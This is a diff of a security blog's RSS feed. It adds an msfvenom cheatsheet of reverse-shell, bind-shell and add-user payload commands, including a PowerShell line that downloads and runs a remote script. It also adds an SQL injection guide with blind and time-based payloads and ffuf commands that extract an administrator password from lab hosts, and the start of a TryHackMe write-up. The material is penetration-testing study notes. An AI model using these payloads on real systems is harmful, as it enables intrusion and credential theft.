@@ -6,8 +6,288 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Mon, 15 Aug 2022 19:32:59 +0100</lastBuildDate>
+        <lastBuildDate>Tue, 30 Aug 2022 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://kafkaesc.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>msfvenom Cheatsheet</title>
+            <link>https://kafkaesc.com/posts/2022/08/msfvenom-cheatsheet/</link>
+            <pubDate>Tue, 30 Aug 2022 00:00:00 +0000</pubDate>
+            
+            <guid>https://kafkaesc.com/posts/2022/08/msfvenom-cheatsheet/</guid>
+            <description>The standard syntax for msfvenom is as follows:
+msfvenom -p &amp;lt;PAYLOAD&amp;gt; &amp;lt;OPTIONS&amp;gt;
+For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&amp;lt;listen-IP&amp;gt; LPORT=&amp;lt;listen-port&amp;gt;
+Staged vs Stageless There are two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.
+  Staged payloads are sent in two parts. The first part is called the stager.</description>
+            <content type="html"><![CDATA[<p>The standard syntax for msfvenom is as follows:</p>
+<p><code>msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</code></p>
+<p>For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:</p>
+<p><code>msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt;</code></p>
+<h2 id="staged-vs-stageless">Staged vs Stageless</h2>
+<p>There are two concepts which must be introduced: <em><strong>staged</strong></em> reverse shell payloads and <em><strong>stageless</strong></em> reverse shell payloads.</p>
+<ul>
+<li>
+<p><em><strong>Staged</strong></em> payloads are sent in two parts. The first part is called the <em>stager</em>. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn&rsquo;t actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts &ndash; a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener &ndash; usually the Metasploit multi/handler, which will be covered in the next task.</p>
+</li>
+<li>
+<p><em><strong>Stageless</strong></em> payloads are a simple binary file. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.</p>
+</li>
+</ul>
+<h2 id="payload-naming-conventions">Payload Naming Conventions</h2>
+<p>The basic convention is as follows:</p>
+<p><code>&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</code></p>
+<p>For example:</p>
+<p><code>linux/x86/shell_reverse_tcp</code></p>
+<p>This would generate a stageless reverse shell for an x86 Linux target.</p>
+<p>The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:</p>
+<p><code>windows/shell_reverse_tcp   </code></p>
+<p>For a 64bit Windows target, the arch would be specified as normal (x64).</p>
+<p>In the above examples the payload used was <code>shell_reverse_tcp</code>. This indicates that it was a <em>stageless</em> payload. Stageless payloads are denoted with underscores (<code>_</code>). The staged equivalent to this payload would be:</p>
+<p><code>shell/reverse_tcp</code></p>
+<p>As staged payloads are denoted with another forward slash (<code>/</code>).</p>
+<p>This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:</p>
+<p><code>windows/x64/meterpreter/reverse_tcp</code></p>
+<p>A Linux 32bit stageless Meterpreter payload would look like this:</p>
+<p><code>linux/x86/meterpreter_reverse_tcp</code></p>
+<h2 id="payloads">Payloads</h2>
+<table>
+<thead>
+<tr>
+<th>MSFVenom Payload Generation One-Liner</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>msfvenom -l   payloads</td>
+<td>List available payloads</td>
+</tr>
+<tr>
+<td>msfvenom -p PAYLOAD &ndash;list-options</td>
+<td>List payload options</td>
+</tr>
+<tr>
+<td>msfvenom -p   PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT   LHOST=IP</td>
+<td>Payload Encoding</td>
+</tr>
+<tr>
+<td>msfvenom -p   linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf  &gt;  shell.elf</td>
+<td>Linux Meterpreter  reverse shell x86 multi stage</td>
+</tr>
+<tr>
+<td>msfvenom -p   linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf  &gt;  shell.elf</td>
+<td>Linux Meterpreter  bind shell x86 multi stage</td>
+</tr>
+<tr>
+<td>msfvenom -p linux/x64/shell_bind_tcp   RHOST=IP LPORT=PORT -f elf &gt; shell.elf</td>
+<td>Linux bind shell x64 single stage</td>
+</tr>
+<tr>
+<td>msfvenom -p linux/x64/shell_reverse_tcp   RHOST=IP LPORT=PORT -f elf &gt; shell.elf</td>
+<td>Linux reverse shell x64 single stage</td>
+</tr>
+<tr>
+<td>msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe &gt;   shell.exe</td>
+<td>Windows Meterpreter reverse shell</td>
+</tr>
+<tr>
+<td>msfvenom -p   windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent=&ldquo;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&rdquo; -f exe &gt; shell.exe</td>
+<td>Windows Meterpreter http reverse shell</td>
+</tr>
+<tr>
+<td>msfvenom -p   windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe &gt;   shell.exe</td>
+<td>Windows Meterpreter bind shell</td>
+</tr>
+<tr>
+<td>msfvenom -p   windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe &gt;   shell.exe</td>
+<td>Windows CMD Multi Stage</td>
+</tr>
+<tr>
+<td>msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT   -f exe &gt;  shell.exe</td>
+<td>Windows CMD Single Stage</td>
+</tr>
+<tr>
+<td>msfvenom -p   windows/adduser USER=hacker PASS=password -f exe &gt; useradd.exe</td>
+<td>Windows add user</td>
+</tr>
+<tr>
+<td>msfvenom -p   osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho &gt;   shell.macho</td>
+<td>Mac Reverse Shell</td>
+</tr>
+<tr>
+<td>msfvenom -p   osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho  &gt;  shell.macho</td>
+<td>Mac Bind shell</td>
+</tr>
+<tr>
+<td>msfvenom -p   cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw &gt;   shell.py</td>
+<td>Python Shell</td>
+</tr>
+<tr>
+<td>msfvenom -p   cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw &gt;   shell.sh</td>
+<td>BASH Shell</td>
+</tr>
+<tr>
+<td>msfvenom -p   cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw &gt;   shell.pl</td>
+<td>PERL Shell</td>
+</tr>
+<tr>
+<td>msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp &gt;   shell.asp</td>
+<td>ASP Meterpreter shell</td>
+</tr>
+<tr>
+<td>msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw  &gt;  shell.jsp</td>
+<td>JSP Shell</td>
+</tr>
+<tr>
+<td>msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war &gt;   shell.war</td>
+<td>WAR Shell</td>
+</tr>
+<tr>
+<td>msfvenom -p   php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw  &gt;  shell.php   cat shell.php</td>
+<td>pbcopy &amp;&amp; echo &lsquo;?php '</td>
+</tr>
+<tr>
+<td>msfvenom -p   php/reverse_php LHOST=IP LPORT=PORT -f raw  &gt;  phpreverseshell.php</td>
+<td>Php Reverse Shell</td>
+</tr>
+<tr>
+<td>msfvenom -a x86   &ndash;platform Windows -p windows/exec CMD=&ldquo;powershell \&ldquo;IEX(New-Object   Net.webClient).downloadString(&lsquo;http://IP/nishang.ps1&rsquo;)&quot;&rdquo;   -f python</td>
+<td>Windows Exec Nishang Powershell in   python</td>
+</tr>
+<tr>
+<td>msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/shikata_ga_nai -b &ldquo;\x04\xA0&rdquo;</td>
+<td>Bad characters shikata_ga_nai</td>
+</tr>
+<tr>
+<td>msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/fnstenv_mov -b &ldquo;\x04\xA0&rdquo;</td>
+<td>Bad characters fnstenv_mov</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Decteting and Enumerating SQLi</title>
+            <link>https://kafkaesc.com/posts/2022/08/decteting-and-enumerating-sqli/</link>
+            <pubDate>Sat, 27 Aug 2022 00:00:00 +0000</pubDate>
+            
+            <guid>https://kafkaesc.com/posts/2022/08/decteting-and-enumerating-sqli/</guid>
+            <description>Entry point &#39; &amp;quot; ` &#39;) &amp;quot;) `) &#39;)) &amp;quot;)) `)) This should break the query. By adding a comment symbol after, it should be accepted if an injection is present.
+Some sanitization of characters might be in place to prevent injections. Try encoding the payload to bypass it. See more useful payloads examples here.
+Comments MySQL
+#comment -- comment [Note the space after the double dash] /*comment*/ /*! MYSQL Special SQL */ PostgreSQL</description>
+            <content type="html"><![CDATA[<h2 id="entry-point">Entry point</h2>
+<pre><code>'
+&quot;
+`
+')
+&quot;)
+`)
+'))
+&quot;))
+`))
+</code></pre><p>This should break the query. By adding a comment symbol after, it should be accepted if an injection is present.</p>
+<p>Some sanitization of characters might be in place to prevent injections. Try encoding the payload to bypass it. See more useful payloads examples <a href="https://github.com/payloadbox/sql-injection-payload-list/tree/master/Intruder">here</a>.</p>
+<h3 id="comments">Comments</h3>
+<p><strong>MySQL</strong></p>
+<pre><code>#comment   
+-- comment     [Note the space after the double dash]
+/*comment*/
+/*! MYSQL Special SQL */
+</code></pre><p><strong>PostgreSQL</strong></p>
+<pre><code>--comment
+/*comment*/
+</code></pre><p><strong>MSQL</strong></p>
+<pre><code>--comment
+/*comment*/
+</code></pre><p><strong>Oracle</strong></p>
+<pre><code>--comment
+</code></pre><p><strong>SQLite</strong></p>
+<pre><code>--comment
+/*comment*/
+</code></pre><p><strong>HQL</strong> does not support comments</p>
+<h2 id="confirmation">Confirmation</h2>
+<h3 id="logic-based">Logic Based</h3>
+<pre><code>id=1 or 1=1 -- should return the same
+id=1 and 1=2 -- should break
+</code></pre><h3 id="time-based">Time Based</h3>
+<p>Some applications won&rsquo;t return <strong>SQL</strong> errors. There won&rsquo;t be a difference in output even if the logic is incorrect. To get around this issue, the <strong>sleep</strong> function can be used to evaluate the query. If the application takes 10 seconds to respond, this indicates a <strong>blind injection</strong>.</p>
+<p><strong>MySQL</strong> (string concat and logical ops)</p>
+<pre><code>1' + sleep(10)
+1' and sleep(10)
+1' &amp;&amp; sleep(10)
+1' | sleep(10)
+</code></pre><p><strong>PostgreSQL</strong> (only support string concat)</p>
+<pre><code>1' || pg_sleep(10)
+</code></pre><p><strong>MSQL</strong></p>
+<pre><code>1' WAITFOR DELAY '0:0:10'
+</code></pre><p><strong>Oracle</strong></p>
+<pre><code>1' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE('PWND',10)
+</code></pre><p><strong>SQLite</strong></p>
+<pre><code>1' AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+</code></pre><h2 id="enumeration">Enumeration</h2>
+<p>SQL databases have different syntax and functions compared to each other. If the backend recognizes the functions used in our query, that means it&rsquo;s running the same DB language.</p>
+<h3 id="functions">Functions</h3>
+<p><strong>MySQL</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql"><span style="color:#a6e22e">conv</span>(<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">2</span>)<span style="color:#f92672">=</span><span style="color:#a6e22e">conv</span>(<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">2</span>)
+<span style="color:#a6e22e">connection_id</span>()<span style="color:#f92672">=</span><span style="color:#a6e22e">connection_id</span>()
+<span style="color:#a6e22e">crc32</span>(<span style="color:#e6db74">&#39;MySQL&#39;</span>)<span style="color:#f92672">=</span><span style="color:#a6e22e">crc32</span>(<span style="color:#e6db74">&#39;MySQL&#39;</span>)
+</code></pre></div><p><strong>MSSQL</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">BINARY_CHECKSUM(<span style="color:#ae81ff">123</span>)<span style="color:#f92672">=</span>BINARY_CHECKSUM(<span style="color:#ae81ff">123</span>)
+<span style="color:#f92672">@@</span>CONNECTIONS<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>   
+<span style="color:#f92672">@@</span>CONNECTIONS<span style="color:#f92672">=@@</span>CONNECTIONS
+<span style="color:#f92672">@@</span>CPU_BUSY<span style="color:#f92672">=@@</span>CPU_BUSY
+USER_ID(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">=</span>USER_ID(<span style="color:#ae81ff">1</span>)
+</code></pre></div><p><strong>Oracle</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">ROWNUM<span style="color:#f92672">=</span>ROWNUM RAWTOHEX(<span style="color:#e6db74">&#39;AB&#39;</span>)<span style="color:#f92672">=</span>RAWTOHEX(<span style="color:#e6db74">&#39;AB&#39;</span>) LNNVL(<span style="color:#ae81ff">0</span><span style="color:#f92672">=</span><span style="color:#ae81ff">123</span>)
+</code></pre></div><p><strong>PostgreSQL</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#ae81ff">5</span>::int<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>
+<span style="color:#ae81ff">5</span>::integer<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>
+pg_client_encoding()<span style="color:#f92672">=</span>pg_client_encoding()
+get_current_ts_config()<span style="color:#f92672">=</span>get_current_ts_config()
+quote_literal(<span style="color:#ae81ff">42</span>.<span style="color:#ae81ff">5</span>)<span style="color:#f92672">=</span>quote_literal(<span style="color:#ae81ff">42</span>.<span style="color:#ae81ff">5</span>)
+current_database()<span style="color:#f92672">=</span>current_database()
+</code></pre></div><h2 id="union-based-injections">Union Based Injections</h2>
+<h4 id="finding-the-number-of-columns-the-query-returns">Finding the number of columns the query returns</h4>
+<p><strong>ORDER BY</strong></p>
+<pre><code>1' ORDER BY 1--+ #true
+1' ORDER BY 2--+ #true
+1' ORDER BY 3--+ #true
+1' ORDER BY 4--+ #false 
+</code></pre><p>It&rsquo;s only using 3 columns so it can&rsquo;t order by 4.
+<code>GROUP BY</code> can also be used.</p>
+<p><strong>UNION SELECT</strong></p>
+<pre><code>1' UNION SELECT null-- - #error
+1' UNION SELECT null,null-- - #error
+1' UNION SELECT null,null,null-- - #valid
+</code></pre><p><strong>null</strong> is used here because the query might have columns of different types.</p>
+<h2 id="blind-sqli">Blind SQLi</h2>
+<p>On a blind SQLi the result of the query is not returned in the HTTP response. But either the contents of the page, the size or status code of the response will be different for a query that returns <strong>True</strong> in comparison to a <strong>False</strong> one.</p>
+<p>Let&rsquo;s say that when <code>' or 1=1 -- </code> is injected, the server has a response that includes the word &ldquo;Welcome&rdquo; in it. If <code>' and 1=1 -- </code> should also return the same response. In contrary, <code>and 1=2 --</code> should return a different one, because the logic is incorrect. Let&rsquo;s say that in this case, when the query is <strong>True</strong>, the word &ldquo;Welcome&rdquo; is returned and when it&rsquo;s <strong>False</strong>, it&rsquo;s not.</p>
+<p>We can use this boolean difference to enumerate the database. The  version can be found with an <code>' and @@version==@@version</code>, for example.</p>
+<p>Database names, usernames and passwords can be extracted using this method. Using the index of the string&rsquo;s character and the actual character we can query the server for the first letter of a password by iterating through all the possibilities.</p>
+<p>Finding the size of the password:</p>
+<pre><code>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;3)='a
+</code></pre><p>This will return <strong>True</strong> because the password is indeed bigger than 3 letters in length. Eventually, by incrementing the number, the query will return <strong>False</strong> and we&rsquo;ll know the password&rsquo;s length as well.</p>
+<p>Find the first letter (index 1) of a password:</p>
+<pre><code>'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a
+</code></pre><p>The first letter of the administrator&rsquo;s password is being compared to the letter <code>a</code>. If the response to this request contains the word &ldquo;Welcome&rdquo;, means that it is <strong>True</strong> and that the first letter is indeed <code>a</code>, otherwise, it&rsquo;s not. All alphanumeric characters and symbols should be tried until one matches. When it does, the index is incremented and the process is repeated.</p>
+<h4 id="fuff">FUFF</h4>
+<p>Fuzzing with 2 wordlists doing a clusterbomb attack in the cookie header field, proxying through burp for CSRF bypass.</p>
+<p>Examples:
+<strong>Logic Based:</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ffuf -w ./chars.txt:CHAR,./index.txt:INDEX -u https://host -H <span style="color:#e6db74">&#34;Cookie: TrackingId=ktMLKCNva3wpiiPo&#39;+AND+(SELECT+SUBSTRING(password,INDEX,1)+FROM+users+WHERE+username=&#39;a
+</span><span style="color:#e6db74">dministrator&#39;)=&#39;CHAR; session=QyZHOI7eHwoefH5DRbeAeUEmzbS1xaRl&#34;</span> -mr Welcome -x http://localhost:8080 -mode clusterbomb -o fuss -c
+</code></pre></div><p><strong>Conditional Error Based:</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ffuf -w ./chars.txt:LETTER,./index.txt:INDEX -u https://0aa400fb041b1875c0387e8800e9003e.web-security-academy.net/filter<span style="color:#ae81ff">\?</span>category<span style="color:#ae81ff">\=</span>Gifts -H <span style="color:#e6db74">&#34;Cookie: TrackingId=nhqRBJVAKZSVZnpa&#39;||(SELECT+CASE+WHEN+SUBSTR(password,INDEX,1)%3d&#39;LETTER&#39;+THEN+TO_CHAR(1/0)+ELSE+&#39;&#39;+END+FROM+users+WHERE+username%3d&#39;administrator&#39;)||&#39;; session=rLnfAHIZ4EviPJ9C17LTUlm02EqsFF1m&#34;</span> -mc <span style="color:#ae81ff">500</span> -x http://localhost:8080 -mode clusterbomb -o fuss -c
+
+</code></pre></div><p><strong>Time Based:</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ffuf -w ./chars.txt:LETTER,./index.txt:INDEX -u https://0a7d006204f34c2dc0595a1a002c004c.web-security-academy.net/filter<span style="color:#ae81ff">\?</span>category<span style="color:#ae81ff">\=</span>Gifts -H <span style="color:#e6db74">&#34;Cookie: TrackingId=yK7dpq9Xejv8M4qn&#39;%3BSELECT+CASE+WHEN+(username=&#39;administrator&#39;+and+substring(password,INDEX,1)=&#39;LETTER&#39;)+THEN+pg_sleep(1)+ELSE+pg_sleep(0)+END+from+users--; session=d2Yzd5ulcyf9UUzuAxdfxPLl7N7ZZGm5&#34;</span> -ft <span style="color:#e6db74">&#39;&lt;1000&#39;</span> -x http://localhost:8080 -mode clusterbomb -c -t <span style="color:#ae81ff">1</span>
+</code></pre></div>]]></content>
+        </item>
         
         <item>
             <title>Get sharable link of an instagram video posts from private accounts</title>
@@ -72,11 +352,11 @@ Windows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT\Directory\background\she
         </item>
         
         <item>
-            <title>Google Dorking Cheat Sheet</title>
-            <link>https://kafkaesc.com/posts/2022/08/google-dorking-cheat-sheet/</link>
+            <title>Google Dorking Cheatsheet</title>
+            <link>https://kafkaesc.com/posts/2022/08/google-dorking-cheatsheet/</link>
             <pubDate>Mon, 15 Aug 2022 00:00:00 +0000</pubDate>
             
-            <guid>https://kafkaesc.com/posts/2022/08/google-dorking-cheat-sheet/</guid>
+            <guid>https://kafkaesc.com/posts/2022/08/google-dorking-cheatsheet/</guid>
             <description>Search filters    Filter Description Example     allintext Searches for occurrences of all the keywords given. allintext:&amp;quot;keyword&amp;quot;   intext Searches for the occurrences of keywords all at once or one at a time. intext:&amp;quot;keyword&amp;quot;   inurl Searches for a URL matching one of the keywords. inurl:&amp;quot;keyword&amp;quot;   allinurl Searches for a URL matching all the keywords in the query. allinurl:&amp;quot;keyword&amp;quot;   intitle Searches for occurrences of keywords in title all or one.</description>
             <content type="html"><![CDATA[<h2 id="search-filters">Search filters</h2>
 <table>
@@ -226,6 +506,157 @@ setxkbmap -option caps:swapescape  Note: To run it automatically at start, add t
 </code></pre></div><blockquote>
 <p>Note: To run it automatically at start, add the command to <code>~/.xinitrc</code></p>
 </blockquote>
+]]></content>
+        </item>
+        
+        <item>
+            <title>THM - Retro</title>
+            <link>https://kafkaesc.com/posts/2022/06/thm-retro/</link>
+            <pubDate>Wed, 22 Jun 2022 00:00:00 +0000</pubDate>
+            
+            <guid>https://kafkaesc.com/posts/2022/06/thm-retro/</guid>
+            <description>Enum nmap Nmap scan report for 10.10.34.228 Host is up (0.20s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: IIS Windows Server | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: RETROWEB | NetBIOS_Domain_Name: RETROWEB | NetBIOS_Computer_Name: RETROWEB | DNS_Domain_Name: RetroWeb | DNS_Computer_Name: RetroWeb | Product_Version: 10.</description>
+            <content type="html"><![CDATA[<h2 id="enum">Enum</h2>
+<h4 id="nmap">nmap</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Nmap scan report <span style="color:#66d9ef">for</span> 10.10.34.228
+Host is up <span style="color:#f92672">(</span>0.20s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65533</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: RETROWEB
+|   NetBIOS_Domain_Name: RETROWEB
+|   NetBIOS_Computer_Name: RETROWEB
+|   DNS_Domain_Name: RetroWeb
+|   DNS_Computer_Name: RetroWeb
+|   Product_Version: 10.0.14393
+|_  System_Time: 2022-06-22T16:00:06+00:00
+|_ssl-date: 2022-06-22T16:00:07+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>RetroWeb
+| Issuer: commonName<span style="color:#f92672">=</span>RetroWeb
+| Public Key type: rsa
+| Public Key bits: <span style="color:#ae81ff">2048</span>
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-06-21T15:42:16
+| Not valid after:  2022-12-21T15:42:16
+| MD5:   <span style="color:#ae81ff">8032</span> c42e 1ed7 c7c2 b8bf da22 e9a2 b046
+|_SHA-1: 41ac 6d61 132d 44ba dccd db04 bf1b 3c1a 4e47 d585
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre></div><p><strong>Ports:</strong> 80, 3389</p>
+<h4 id="directory-busting-on-port-80">Directory busting on port 80</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">301</span>        2l       10w      149c http://10.10.34.228/retro
+<span style="color:#ae81ff">301</span>        2l       10w      160c http://10.10.34.228/retro/wp-content
+<span style="color:#ae81ff">301</span>        2l       10w      167c http://10.10.34.228/retro/wp-content/themes
+<span style="color:#ae81ff">301</span>        2l       10w      168c http://10.10.34.228/retro/wp-content/uploads
+<span style="color:#ae81ff">301</span>        2l       10w      161c http://10.10.34.228/retro/wp-includes
+<span style="color:#ae81ff">301</span>        2l       10w      168c http://10.10.34.228/retro/wp-content/plugins
+<span style="color:#ae81ff">301</span>        2l       10w      168c http://10.10.34.228/retro/wp-includes/images
+<span style="color:#ae81ff">301</span>        2l       10w      168c http://10.10.34.228/retro/wp-includes/Images
+<span style="color:#ae81ff">301</span>        2l       10w      174c http://10.10.34.228/retro/wp-includes/images/media
+<span style="color:#ae81ff">301</span>        2l       10w      174c http://10.10.34.228/retro/wp-includes/Images/media
+<span style="color:#ae81ff">301</span>        2l       10w      166c http://10.10.34.228/retro/wp-includes/text
+<span style="color:#ae81ff">301</span>        2l       10w      168c http://10.10.34.228/retro/wp-content/upgrade
+<span style="color:#ae81ff">301</span>        2l       10w      176c http://10.10.34.228/retro/wp-includes/images/smilies
+<span style="color:#ae81ff">301</span>        2l       10w      165c http://10.10.34.228/retro/wp-includes/css
+<span style="color:#ae81ff">301</span>        2l       10w      174c http://10.10.34.228/retro/wp-includes/Images/Media
+<span style="color:#ae81ff">301</span>        2l       10w      171c http://10.10.34.228/retro/wp-includes/text/diff
+<span style="color:#ae81ff">301</span>        2l       10w      174c http://10.10.34.228/retro/wp-includes/certificates
+<span style="color:#ae81ff">301</span>        2l       10w      167c http://10.10.34.228/retro/wp-includes/Fonts
+<span style="color:#ae81ff">301</span>        2l       10w      158c http://10.10.34.228/retro/wp-admin
+<span style="color:#ae81ff">301</span>        2l       10w      165c http://10.10.34.228/retro/wp-admin/images
+<span style="color:#ae81ff">301</span>        2l       10w      163c http://10.10.34.228/retro/wp-admin/user
+<span style="color:#ae81ff">301</span>        2l       10w      165c http://10.10.34.228/retro/wp-admin/Images
+<span style="color:#ae81ff">301</span>        2l       10w      166c http://10.10.34.228/retro/wp-admin/network
+<span style="color:#ae81ff">301</span>        2l       10w      162c http://10.10.34.228/retro/wp-admin/css
+<span style="color:#ae81ff">301</span>        2l       10w      167c http://10.10.34.228/retro/wp-admin/includes
+<span style="color:#ae81ff">301</span>        2l       10w      166c http://10.10.34.228/retro/wp-includes/Text
+<span style="color:#ae81ff">301</span>        2l       10w      168c http://10.10.34.228/retro/wp-content/Uploads
+<span style="color:#ae81ff">301</span>        2l       10w      166c http://10.10.34.228/retro/wp-admin/Network
+<span style="color:#ae81ff">301</span>        2l       10w      176c http://10.10.34.228/retro/wp-includes/Images/crystal
+<span style="color:#ae81ff">301</span>        2l       10w      161c http://10.10.34.228/retro/wp-admin/JS
+
+</code></pre></div><h3 id="wordpress">Wordpress</h3>
+<p><strong>Running wpscan</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> WordPress readme found: http://10.10.34.228/retro/readme.html
+ | Found By: Direct Access <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ | Confidence: 100%
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The external WP-Cron seems to be enabled: http://10.10.34.228/retro/wp-cron.php
+ | Found By: Direct Access <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> WordPress version 5.2.1 identified <span style="color:#f92672">(</span>Insecure, released on 2019-05-21<span style="color:#f92672">)</span>.
+ | Found By: Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+ |  - http://10.10.34.228/retro/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v<span style="color:#f92672">=</span>5.2.1&lt;/generator&gt;
+ |  - http://10.10.34.228/retro/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v<span style="color:#f92672">=</span>5.2.1&lt;/generator&gt;
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> WordPress theme in use: 90s-retro
+ | Location: http://10.10.34.228/retro/wp-content/themes/90s-retro/
+ | Latest Version: 1.4.10 <span style="color:#f92672">(</span>up to date<span style="color:#f92672">)</span>
+ | Last Updated: 2019-04-15T00:00:00.000Z
+ | Readme: http://10.10.34.228/retro/wp-content/themes/90s-retro/readme.txt
+ | Style URL: http://10.10.34.228/retro/wp-content/themes/90s-retro/style.css?ver<span style="color:#f92672">=</span>5.2.1
+ | Style Name: 90s Retro
+ | Style URI: https://organicthemes.com/retro-theme/
